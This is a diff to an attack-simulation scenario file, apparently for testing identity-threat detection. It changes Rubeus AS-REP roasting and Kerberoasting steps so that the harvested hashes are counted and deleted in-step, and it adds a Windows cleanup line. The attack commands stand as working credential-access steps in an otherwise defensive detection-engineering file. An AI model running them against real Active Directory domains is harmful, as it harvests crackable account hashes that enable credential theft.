@@ -138,7 +138,19 @@ steps:
     mitre_technique: "T1558.004"
     platforms: ["linux", "windows"]
     platform_variants:
-      windows: "Rubeus.exe asreproast /user:helpdesk-admin /format:hashcat /outfile:C:\\Windows\\Temp\\asrep.txt"
+      # The roastable hashes used to be left in C:\Windows\Temp\asrep.txt for
+      # good. They are now written under a CortexSim-owned directory, counted,
+      # and deleted in-step; the detection is the DC-side 4768, not the file.
+      windows: |
+        $d = Join-Path $env:TEMP 'cortexsim-itdr006'
+        New-Item -ItemType Directory -Force -Path $d | Out-Null
+        $out = Join-Path $d 'asrep.txt'
+        Rubeus.exe asreproast /user:helpdesk-admin /format:hashcat "/outfile:$out"
+        $rc = $LASTEXITCODE
+        $n = if (Test-Path -LiteralPath $out) { @(Get-Content -LiteralPath $out).Count } else { 0 }
+        Remove-Item -Recurse -Force $d
+        if ($rc -ne 0) { Write-Error "Rubeus asreproast exited $rc"; exit $rc }
+        Write-Output "cortexsim-itdr006-asrep-roast hashes=$n (file deleted in-step)"
     # Same operator source host that ran the SPN sweep now roasts a pre-auth-
     # disabled account — shared_entity on src_host ties the AD-side signals to
     # one origin (detection is DC-side 4768, no endpoint fork to trace).
@@ -170,7 +182,17 @@ steps:
     mitre_technique: "T1558.003"
     platforms: ["linux", "windows"]
     platform_variants:
-      windows: "Rubeus.exe kerberoast /rc4opsec /outfile:C:\\Windows\\Temp\\tgs.txt"
+      # Same as step-02: the TGS hashes no longer outlive the step.
+      windows: |
+        $d = Join-Path $env:TEMP 'cortexsim-itdr006'
+        New-Item -ItemType Directory -Force -Path $d | Out-Null
+        $out = Join-Path $d 'tgs.txt'
+        Rubeus.exe kerberoast /rc4opsec "/outfile:$out"
+        $rc = $LASTEXITCODE
+        $n = if (Test-Path -LiteralPath $out) { @(Get-Content -LiteralPath $out).Count } else { 0 }
+        Remove-Item -Recurse -Force $d
+        if ($rc -ne 0) { Write-Error "Rubeus kerberoast exited $rc"; exit $rc }
+        Write-Output "cortexsim-itdr006-kerberoast hashes=$n (file deleted in-step)"
     # Continues the harvest from the SAME operator source host — shared_entity on
     # src_host so CR-ITDR-0006 folds the AS-REP roast and this TGS burst into one
     # Credential Access incident.
@@ -202,6 +224,11 @@ steps:
 cleanup:
   commands:
     - "rm -f /tmp/cortexsim_itdr006_users.txt /tmp/cortexsim_itdr006_asrep.txt /tmp/cortexsim_itdr006_tgs.txt"
+    # Windows: a step interrupted before its in-step delete leaves the hashes
+    # here. The bash bundle and the K8s bootstrap do NOT run this line:
+    # push_generator withholds a Windows-only cleanup line from the POSIX
+    # target and names it in a `# skipped (Windows-only)` comment.
+    - 'cmd.exe /c if exist "%TEMP%\cortexsim-itdr006" rd /s /q "%TEMP%\cortexsim-itdr006"'
     - "echo '[CortexSim] SIM-ITDR-006 cleanup complete'"
 
 author: "Henry Reed"
